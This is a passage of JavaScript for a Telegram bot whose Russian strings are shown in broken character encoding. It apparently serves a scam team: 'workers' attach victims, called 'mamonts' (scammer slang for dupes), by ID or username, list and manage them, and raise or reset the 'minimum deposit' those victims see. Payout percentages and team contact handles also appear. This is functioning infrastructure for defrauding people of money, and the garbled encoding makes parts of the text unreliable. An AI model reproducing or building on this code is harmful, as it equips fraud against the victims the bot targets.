            '–û–±—ã—á–Ω–æ–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ ‚Äî 75%\n' +
            '–ó–∞–ª—ë—Ç —á–µ—Ä–µ–∑ –ø–æ–¥–¥–µ—Ä–∂–∫—É ‚Äî 60%\n' +
            '–ü—Ä—è–º–æ–π –ø–µ—Ä–µ–≤–æ–¥ ‚Äî 70%\n' +
            '‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n' +
            'üëë –ö–æ–º–∞–Ω–¥–∞ –ø—Ä–æ–µ–∫—Ç–∞ : \n' +
            '\n' +
            '–¢–°/–¢–ü: @hype_rokky\n' +
            '–ù–∞—Å—Ç–∞–≤–Ω–∏–∫: @mobilizator_aye\n' +
            '‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n' +
            '–°–æ—Å—Ç–æ—è–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–æ–≤:\n' +
            '\n' +
            'üåï FULL-WORK\n', InfoButtonOptions);
    }

});

bot1.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const buttonData = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;

    if (buttonData === 'settings') {
        await sequelize.authenticate()
        await sequelize.sync()
        const worker = await UserModel.findOne({
            where: {
                chatId: chatId.toString()
            }
        });
        bot1.sendMessage(chatId, `–ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –¥–µ–ø–æ–∑–∏—Ç: ${worker.minDeposit}`, SettingsOptions);
    } else if (buttonData === 'additional_button') {
        await sequelize.authenticate()
        await sequelize.sync()
        const worker = await UserModel.findOne({
            where: {
                chatId: chatId.toString()
            }
        });
        if (worker.minDeposit === 20500) {
            worker.minDeposit = 1000;
            worker.save();

            bot1.editMessageText('–ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π —Å–∫–∏–Ω—É—Ç –¥–æ 1000!\n' + `–ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –¥–µ–ø–æ–∑–∏—Ç: ${worker.minDeposit}`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{
                            text: '–£–≤–µ–ª–∏—á–∏—Ç—å',
                            callback_data: 'additional_button'
                        }]
                    ]
                })
            });
        } else {
            worker.minDeposit += 1500;
            worker.save();
            bot1.editMessageText('–ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –¥–µ–ø–æ–∑–∏—Ç —É–≤–µ–ª–∏—á–µ–Ω!\n' + `–ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –¥–µ–ø–æ–∑–∏—Ç: ${worker.minDeposit}`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{
                            text: '–£–≤–µ–ª–∏—á–∏—Ç—å',
                            callback_data: 'additional_button'
                        }]
                    ]
                })
            });
        }
        worker.mamonts.forEach(async (mamontId) => {
            const mamont = await UserModel.findOne({
                where: {
                    chatId: mamontId,
                }
            });

            mamont.minDeposit = worker.minDeposit;

            mamont.save();
        });


    } else if (buttonData === 'management') {
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞–∂–∞—Ç–∏—è –Ω–∞ –∫–Ω–æ–ø–∫—É "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º–∞–º–æ–Ω—Ç–∞–º–∏"
        await sequelize.authenticate()
        await sequelize.sync()
        const worker = await UserModel.findOne({
            where: {
                chatId: chatId.toString()
            }
        });

        if (worker.mamonts.length === 0) {
            return bot1.sendMessage(chatId, '–£ –≤–∞—Å –Ω–µ—Ç –º–∞–º–æ–Ω—Ç–æ–≤');
        }
        const mamontsArr = []

        for (const mamontId of worker.mamonts) {
            const mamont = await UserModel.findOne({
                where: {
                    chatId: mamontId,
                }
            });

            mamontsArr.push([{
                text: `${mamont.username === '' ? `${mamont.chatId}`: `${mamont.username} | ${mamont.chatId}`}`,
                callback_data: `${mamont.chatId}`
            }]);
        }

        bot1.sendMessage(chatId, '_–í—ã–±–µ—Ä–∏—Ç–µ –∏–∑ —Å–ø–∏—Å–∫–∞:_', {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: mamontsArr
            }
        });

        bot1.on('callback_query', async function mamontManager(callbackQuery) {
            const chatId = callbackQuery.message.chat.id;
            const mamontId = callbackQuery.data;
            const messageId = callbackQuery.message.message_id;
            const username = callbackQuery.message.from.username;

            bot1.deleteMessage(chatId, messageId);
            bot1.removeListener('callback_query', mamontManager);

            sendMamontInfo(chatId, mamontId);
        })
    } else if (buttonData === 'chat_info') {
        bot1.sendMessage(chatId, '–ó–¥–µ—Å—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø—Ä–æ–µ–∫—Ç–µ.');
    } else if (buttonData === 'chat_payed') {
        bot1.sendMessage(chatId, '–ó–¥–µ—Å—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ–µ–∫—Ç–∞.');
    } else if (buttonData === 'manuals') {
        bot1.sendMessage(chatId, '–ó–¥–µ—Å—å –∫–æ–Ω—Ç–∞–∫—Ç–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è.');
    } else if (buttonData === 'chat_workers') {
        bot1.sendMessage(chatId, '–ó–¥–µ—Å—å –±—É–¥—É—Ç –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏.');
    }

    if (buttonData === 'connect_mamont') {
        bot1.sendMessage(chatId, '–í–≤–µ–¥–∏—Ç–µ Id/Username:')

        bot1.on('message', async function addMamont(msg) {
            const chatId = msg.chat.id;
            const text = msg.text;
            const worker = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            if (/^\d+$/.test(text)) {
                const mamont = await UserModel.findOne({
                    where: {
                        chatId: text
                    }
                });

                if (mamont) {
                    mamont.worker = chatId.toString();
                    await mamont.save();
                    const updatedMamonts = [...worker.mamonts, text];
                    await worker.update({
                        mamonts: updatedMamonts
                    });
                    bot1.removeListener('message', addMamont);
                    return bot1.sendMessage(chatId, '–ú–∞–º–æ–Ω—Ç —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω');
                } else {
                    bot1.removeListener('message', addMamont);
                    return bot1.sendMessage(chatId, '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω');
                }
            }

            const mamont = await UserModel.findOne({
                where: {
                    username: text
                }
            });

            if (mamont) {
                mamont.worker = chatId.toString();
                await mamont.save();
                const updatedMamonts = [...worker.mamonts, mamont.chatId];
                await worker.update({
                    mamonts: updatedMamonts
                });
                bot1.removeListener('message', addMamont);
                return bot1.sendMessage(chatId, '–ú–∞–º–æ–Ω—Ç —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω');
            } else {
                bot1.removeListener('message', addMamont);
                return bot1.sendMessage(chatId, `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω`);
            }
        })
    }
});